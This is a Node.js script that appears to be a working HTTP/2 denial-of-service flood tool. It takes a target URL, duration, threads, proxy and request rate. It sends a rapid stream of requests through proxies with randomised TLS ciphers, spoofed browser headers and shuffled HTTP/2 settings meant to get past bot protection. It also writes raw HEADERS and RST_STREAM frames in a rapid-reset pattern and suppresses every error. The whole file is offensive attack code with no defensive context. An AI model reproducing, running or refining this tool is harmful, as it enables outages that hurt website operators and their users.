const url = require('url')
	, fs = require('fs')
	, http2 = require('http2')
	, http = require('http')
	, tls = require('tls')
	, net = require('net')
	, request = require('request')
	, cluster = require('cluster')
const crypto = require('crypto');
const HPACK = require('hpack');
const currentTime = new Date();
const os = require("os");
const httpTime = currentTime.toUTCString();






const errorHandler = error => {
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}
function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
cplist = [
		'TLS_AES_128_CCM_8_SHA256',
		'TLS_AES_128_CCM_SHA256',
		'TLS_CHACHA20_POLY1305_SHA256',
		'TLS_AES_256_GCM_SHA384',
		'TLS_AES_128_GCM_SHA256'
		, ]
const sigalgs = [
	'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512'
	, 'ecdsa_brainpoolP256r1tls13_sha256'
	, 'ecdsa_brainpoolP384r1tls13_sha384'
	, 'ecdsa_brainpoolP512r1tls13_sha512'
	, 'ecdsa_sha1'
	, 'ed25519'
	, 'ed448'
	, 'ecdsa_sha224'
	, 'rsa_pkcs1_sha1'
	, 'rsa_pss_pss_sha256'
	, 'dsa_sha256'
	, 'dsa_sha384'
	, 'dsa_sha512'
	, 'dsa_sha224'
	, 'dsa_sha1'
	, 'rsa_pss_pss_sha384'
	, 'rsa_pkcs1_sha2240'
	, 'rsa_pss_pss_sha512'
	, 'sm2sig_sm3'
	, 'ecdsa_secp521r1_sha512'
, ];
let sig = sigalgs.join(':');

controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400']
	, ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError']
	, ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
const headerFunc = {
	cipher() {
		return cplist[Math.floor(Math.random() * cplist.length)];
	}
, }

process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);

const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
const rps = process.argv[6];
if (!/^https?:\/\//i.test(target)) {
	console.error('sent with http:// or https://');
	process.exit(1);
}
proxyr = proxyFile
if (isNaN(rps) || rps <= 0) {
	console.error('number rps');
	process.exit(1);
}
const MAX_RAM_PERCENTAGE = 70;
const RESTART_DELAY = 100;
if (cluster.isMaster) {
  console.log("@CRISXTOP".bgRed);
	for (let counter = 1; counter <= thread; counter++) {
		cluster.fork();
	}
	const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script via', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage percentage exceeded:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
	setInterval(handleRAMUsage, 5000);
	setTimeout(() => process.exit(-1), time * 1000);
} else {
    setInterval(function() {
        flood()
      }, 1);
    
  }

function flood() {
	var parsed = url.parse(target);
	var cipper = headerFunc.cipher();
	var proxy = proxyr.split(':');
	
	function randstra(length) {
		const characters = "0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}

	function randstr(minLength, maxLength) {
		const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
const randomStringArray = Array.from({ length }, () => {
const randomIndex = Math.floor(Math.random() * characters.length);
return characters[randomIndex];
});

return randomStringArray.join('');
}

	const randstrsValue = randstr(25);
function generateRandomString(minLength, maxLength) {
					const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });

  return randomStringArray.join('');
}
function shuffleObject(obj) {
					const keys = Object.keys(obj);
				  
					for (let i = keys.length - 1; i > 0; i--) {
					  const j = Math.floor(Math.random() * (i + 1));
					  [keys[i], keys[j]] = [keys[j], keys[i]];
					}
				  
					const shuffledObject = {};
					for (const key of keys) {
					  shuffledObject[key] = obj[key];
					}
				  
					return shuffledObject;
				  }
const hd = {}
 function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
   
           nodeii = getRandomInt(109,124)
           cache = ["no-cache", "no-store", "no-transform", "only-if-cached", "max-age=0", "must-revalidate", "public", "private", "proxy-revalidate", "s-maxage=86400"];
           const headers = {
    ":method": "GET",
    ":authority": parsed.host,
    ":scheme": "https",
    ":path": parsed.path,
    ...shuffleObject({
    "sec-ch-ua": `"Not)B;Brand";v="${getRandomInt(100, 99999)}", "Google Chrome";v="${nodeii}", "Chromium";v="${nodeii}"`,
    "Pragma": "no-cache",
    ...(Math.random() < 0.4 ? { "cache-control": cache } : {}),
    ...(Math.random() < 0.8 ? { "sec-ch-ua-mobile": "?0"} : {}),
    "sec-fetch-site": "none",
    ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
    ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
    ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
     ...(Math.random() < 0.3 ?{"purpure-secretf-id": "formula-"+generateRandomString(1, 2)}:{}),
    ...(Math.random() < 0.6 ?{[generateRandomString(1, 2)+"-city-date-"+generateRandomString(1, 2)]: "zero-"+generateRandomString(1, 2)}:{}),
    ...(Math.random() < 0.6 ?{["accept-bad-"+generateRandomString(1, 2)]: "router-"+generateRandomString(1, 2)}:{}),
    ...(Math.random() < 0.3 ?{"sec-stake-fommunity": "bet-clc"}:{}),
    "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br, cdnfly",
    "sec-ch-ua-platform": "Brand-Windows-" + generateRandomString(5, 30),
     }),
    "user-agent": process.argv[8],
    "cookie": process.argv[7],
    ...(Math.random() < 0.5 ? { "upgrade-insecure-requests": "1" } : {}),
    "accept-language": "ru,en-US;q=0.9,en;q=0.8"
}
if( Math.random >= 0.5) {
  headers = {
      ...(Math.random() < 0.6 ?{["Junk-size-Selfish"+generateRandomString(1, 2)]: "zefr-"+generateRandomString(1, 2)}:{}),
      ...(Math.random() < 0.6 ?{["HTTP-requests-with-unusual-HTTP-headers-or-URI-path"]: "RIFSK-"+generateRandomString(1, 2)}:{}),
      "cache-control" : "0-cancel",
      ...(Math.random() < 0.3 ?{["Request-Coming-From-Known-bad-source" ]: "user-"+generateRandomString(1, 2)}:{}),
      ...(Math.random() < 0.3 ?{["HTTP-requests-from-known-botnet"]: "zefr-"+generateRandomString(1, 2)}:{}),
      ...(Math.random() < 0.3 ?{["RiskKILDNN-"+generateRandomString(1, 2)]: "RIFSK-"+generateRandomString(1, 2)}:{}),
  }
  } 
        

	const agent = new http.Agent({
		host: proxy[0]
		, port: proxy[1]
		, keepAlive: true
		, keepAliveMsecs: 500000000
		, maxSockets: 50000
		, maxTotalSockets: 100000
	, });
	const Optionsreq = {
		agent: agent
		, method: 'CONNECT'
		, path: parsed.host + ':443'
		, timeout: 5000
		, headers: {
			'Host': parsed.host
			, 'Proxy-Connection': 'Keep-Alive'
			, 'Connection': 'close'
		, 'Proxy-Authorization': `Basic ${Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64')}`
    ,}
	, };
	connection = http.request(Optionsreq, (res) => {});
	const TLSOPTION = {
		ciphers: cipper
		, secureProtocol: ["TLSv1_3_method"]
		, sigals: sig
		, secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom
		, echdCurve: "X25519"
		, secure: true
		, rejectUnauthorized: false
		, ALPNProtocols: ['h2']
	, };

	function createCustomTLSSocket(parsed, socket) {
    const tlsSocket = tls.connect({
			...TLSOPTION
			, host: parsed.host
			, port: 443
			, servername: parsed.host
			, socket: socket
		});
		tlsSocket.setKeepAlive(true, 60000);
    tlsSocket.allowHalfOpen = true;
    tlsSocket.setNoDelay(true);
    tlsSocket.setMaxListeners(0);

    return tlsSocket;
}
 function taoDoiTuongNgauNhien() {
  const doiTuong = {};
  function getRandomNumber(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
maxi = getRandomNumber(1,4)
  for (let i = 1; i <=maxi ; i++) {
    
    
 const key = 'custom-sec-'+ generateRandomString(1,9)

    const value =  generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)

    doiTuong[key] = value;
  }

  return doiTuong;
}
	 
	connection.on('connect', function (res, socket) {
    const tlsSocket = createCustomTLSSocket(parsed, socket);
    socket.setKeepAlive(true, 100000);

    let clasq = shuffleObject({
    ...(Math.random() < 0.5 ? { headerTableSize: 65536 } : {}),
    ...(Math.random() < 0.5 ? { maxConcurrentStreams: 1000 } : {}),
    enablePush: false,
    ...(Math.random() < 0.5 ? { [getRandomInt(100, 99999)]: getRandomInt(100, 99999) } : {}),
    ...(Math.random() < 0.5 ? { [getRandomInt(100, 99999)]: getRandomInt(100, 99999) } : {}),
    enableConnectProtocol: false,
    ...(Math.random() < 0.5 ? { initialWindowSize: 6291456 } : {}),
    ...(Math.random() < 0.5 ? { maxHeaderListSize: 262144 } : {}),
    ...(Math.random() < 0.5 ? { maxFrameSize: 16384 } : {})
});

function incrementClasqValues() {
    if (clasq.headerTableSize) clasq.headerTableSize += 1;
    if (clasq.maxConcurrentStreams) clasq.maxConcurrentStreams += 1;
    if (clasq.initialWindowSize) clasq.initialWindowSize += 1;
    if (clasq.maxHeaderListSize) clasq.maxHeaderListSize += 1;
    if (clasq.maxFrameSize) clasq.maxFrameSize += 1;
}

setInterval(incrementClasqValues, 5000);
    let hpack = new HPACK();
    


    const clients = [];
    const client = http2.connect(parsed.href, {
		
		settings: clasq,
    "unknownProtocolTimeout": 10,
    "maxReservedRemoteStreams": 2000,
    "maxSessionMemory": 200,
   createConnection: () => tlsSocket
	});
clients.push(client);
client.setMaxListeners(0);
const updateWindow = Buffer.alloc(4);
    updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);
    client.on('remoteSettings', (settings) => {
        const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
        client.setLocalWindowSize(localWindowSize, 0);
    });
    const frames = [
Buffer.from(PREFACE, 'binary'),
encodeFrame(0, 4, encodeSettings([
[1, 65535],
[2, 0],
[4, 6291456],
[6, 262144],
])),
encodeFrame(0, 8, updateWindow)
];
    client.on('connect', () => {
        client.ping((err, duration, payload) => {
            if (err) {
            } else {
            }
        });
        
    });

    clients.forEach(client => {
        const intervalId = setInterval(async () => {
            const requests = [];
            let count = 0;
            
            let currenthead = 0;
			const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('');
	    currenthead += 1
			if (currenthead == 1) {
                            headers["sec-ch-ua"] = `${randomString}`;
                        } else if (currenthead == 2) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = `${randomString}`;
                        } else if (currenthead == 3) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `${randomString}`;
                        } else if (currenthead == 4) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `"Windows"`;
                            headers["upgrade-insecure-requests"] = `${randomString}`;
                        } else if (currenthead === 5) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `"Windows"`;
                            headers["upgrade-insecure-requests"] = "1";
                        } else if (currenthead === 6) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `"Windows"`;
                            headers["upgrade-insecure-requests"] = "1";
                            headers["accept"] = `${randomString}`;
                        } else if (currenthead === 7) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `"Windows"`;
                            headers["upgrade-insecure-requests"] = "1";
                            headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                            headers["sec-fetch-site"] = `${randomString}`;
                        } else if (currenthead === 8) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `"Windows"`;
                            headers["upgrade-insecure-requests"] = "1";
                            headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                            headers["sec-fetch-site"] = "none";
                            headers["sec-fetch-mode"] = `${randomString}`;
                        } else if (currenthead === 9) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `"Windows"`;
                            headers["upgrade-insecure-requests"] = "1";
                            headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                            headers["sec-fetch-site"] = "none";
                            headers["sec-fetch-mode"] = "navigate";
                            headers["sec-fetch-user"] = `${randomString}`;
                        } else if (currenthead === 10) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `"Windows"`;
                            headers["upgrade-insecure-requests"] = "1";
                            headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                            headers["sec-fetch-site"] = "none";
                            headers["sec-fetch-mode"] = "navigate";
                            headers["sec-fetch-user"] = "?1";
                            headers["sec-fetch-dest"] = `${randomString}`;
                        } else if (currenthead === 11) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `"Windows"`;
                            headers["upgrade-insecure-requests"] = "1";
                            headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                            headers["sec-fetch-site"] = "none";
                            headers["sec-fetch-mode"] = "navigate";
                            headers["sec-fetch-user"] = "?1";
                            headers["sec-fetch-dest"] = "document";
                            headers["accept-encoding"] = `${randomString}`;
                        } else if (currenthead === 12) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `"Windows"`;
                            headers["upgrade-insecure-requests"] = "1";
                            headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                            headers["sec-fetch-site"] = "none";
                            headers["sec-fetch-mode"] = "navigate";
                            headers["sec-fetch-user"] = "?1";
                            headers["sec-fetch-dest"] = "document";
                            headers["accept-encoding"] = "gzip, deflate, br, zstd";
                            currenthead = 0;
                        }
     
                let dynHeaders = shuffleObject({
                    ...taoDoiTuongNgauNhien(),
                    ...taoDoiTuongNgauNhien(),
                });
                const head = {
                    ...dynHeaders,
                    ...headers,
                };
                
                            
                if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                for (let i = 0; i < rps; i++) {
                const requestPromise = new Promise((resolve, reject) => {
                    const request = client.request(head, {
                        weight: Math.random() < 0.5 ? 251 : 231,
                        depends_on: 0,
                        exclusive: Math.random() < 0.5 ? true : false,
                    });
                    request.on('response', response => {
                    request.close(http2.constants.NO_ERROR);
                    request.destroy();
                    resolve();
                            });
                    request.on('end', () => {
                    count++;
                    if (count === time * rps) {
                    clearInterval(intervalId);
                    client.close(http2.constants.NGHTTP2_CANCEL);
                    client.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('NATRAL'));
                    } else if (count=== rps) {
                    client.close(http2.constants.NGHTTP2_CANCEL);
                    client.destroy();
                    clearInterval(intervalId);
                    }
                    reject(new Error('Request timed out'));
                    });
                    request.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
                });

                const packed = Buffer.concat([
                    Buffer.from([0x80, 0, 0, 0, 0xFF]),
                    hpack.encode(head)
                ]);

                let streamId =1;
                let streamIdReset = 1;
                const flags = 0x1 | 0x4 | 0x8 | 0x20;
                
                
                const encodedFrame = encodeFrame(streamId, 1, packed, flags);
                
                const frame = Buffer.concat([encodedFrame]);
                if (streamIdReset >= 5 && (streamIdReset - 5) % 10 === 0) {
                
                tlsSocket.write(Buffer.concat([
                  encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0),
                  frame,
                  frames
                 ]));
                } else if (streamId === 2 && (streamId - 2) % 5 === 0) {
                tlsSocket.write(Buffer.concat([frames])
                );
                }
                
                 
                
                streamIdReset += 2;
                streamId += 2;
                requests.push({ requestPromise, frame });
            }
            try {
                await Promise.all(requests.map(({ requestPromise }) => requestPromise));
            } catch (error) {
            }
                }
                
        }, 500);
        

      
    });

		client.on("close", () => {
			client.destroy();
			tlsSocket.destroy();
			socket.destroy();
			return 
		});




client.on("error", error => {
    if (error.code === 'ERR_HTTP2_GOAWAY_SESSION') {
        console.log('Received GOAWAY error, pausing requests for 10 seconds\r');
        shouldPauseRequests = true;
        setTimeout(() => {
           
            shouldPauseRequests = false;
        },2000);
    } else if (error.code === 'ECONNRESET') {
        
        shouldPauseRequests = true;
        setTimeout(() => {
            
            shouldPauseRequests = false;
        }, 2000);
    }  else {
    }

    client.destroy();
			tlsSocket.destroy();
			socket.destroy();
			return
});

	});


	connection.on('error', (error) => {
		connection.destroy();
		if (error) return;
	});
	connection.on('timeout', () => {
		connection.destroy();
		return
	});
	connection.end();
}//
